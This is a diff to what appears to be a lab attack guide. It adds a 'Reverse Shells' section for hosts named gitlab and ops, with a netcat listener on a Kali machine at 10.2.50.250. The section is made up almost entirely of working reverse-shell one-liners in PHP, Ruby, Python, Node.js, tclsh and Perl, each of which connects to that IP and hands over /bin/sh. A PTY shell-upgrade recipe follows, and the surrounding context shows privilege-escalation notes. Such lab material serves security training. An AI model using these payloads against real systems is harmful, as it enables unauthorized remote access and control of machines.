@@ -373,6 +373,99 @@ sudo watch 'reset; exec /bin/sh 1>&0 2>&0'
 
 ---
 
+## Reverse Shells
+
+Available on both Linux hosts: **gitlab** (10.2.50.15) and **ops** (10.2.50.2).
+
+**Prerequisites:** Kali must be deployed and reachable at `10.2.50.250`.
+
+```bash
+bash scripts/add-kali.sh   # if not already deployed
+```
+
+**Shell upgrade** (run after catching any reverse shell):
+
+```bash
+python3 -c 'import pty; pty.spawn("/bin/bash")'
+# Ctrl+Z
+stty raw -echo; fg
+export TERM=xterm
+```
+
+---
+
+### PHP
+
+```bash
+# 1. Listener — Kali (10.2.50.250)
+nc -lvnp 4444
+
+# 2. Payload — target Linux host
+php -r '$s=fsockopen("10.2.50.250",4444);exec("/bin/sh -i <&3 >&3 2>&3");'
+```
+
+---
+
+### Ruby
+
+```bash
+# 1. Listener — Kali (10.2.50.250)
+nc -lvnp 4444
+
+# 2. Payload — target Linux host
+ruby -rsocket -e 'exit if fork;c=TCPSocket.new("10.2.50.250","4444");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'
+```
+
+---
+
+### Python
+
+```bash
+# 1. Listener — Kali (10.2.50.250)
+nc -lvnp 4444
+
+# 2. Payload — target Linux host
+python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("10.2.50.250",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'
+```
+
+---
+
+### Node.js
+
+```bash
+# 1. Listener — Kali (10.2.50.250)
+nc -lvnp 4444
+
+# 2. Payload — target Linux host
+node -e 'var net=require("net"),cp=require("child_process"),sh=cp.spawn("/bin/sh",[]);var c=new net.Socket();c.connect(4444,"10.2.50.250",function(){c.pipe(sh.stdin);sh.stdout.pipe(c);sh.stderr.pipe(c);});'
+```
+
+---
+
+### tclsh
+
+```bash
+# 1. Listener — Kali (10.2.50.250)
+nc -lvnp 4444
+
+# 2. Payload — target Linux host
+echo 'set s [socket 10.2.50.250 4444];fconfigure $s -translation binary -buffering full;set p [open "|/bin/sh -i" r+];fconfigure $p -translation binary -buffering full;fileevent $s readable "set d [read $s];puts -nonewline $p $d;flush $p";fileevent $p readable "set d [read $p];puts -nonewline $s $d;flush $s";vwait forever' | tclsh
+```
+
+---
+
+### Perl
+
+```bash
+# 1. Listener — Kali (10.2.50.250)
+nc -lvnp 4444
+
+# 2. Payload — target Linux host
+perl -e 'use Socket;$i="10.2.50.250";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
+```
+
+---
+
 ## Linux Capabilities
 
 ### cap_gdb — CAP_SETUID → Root Shell (ops)
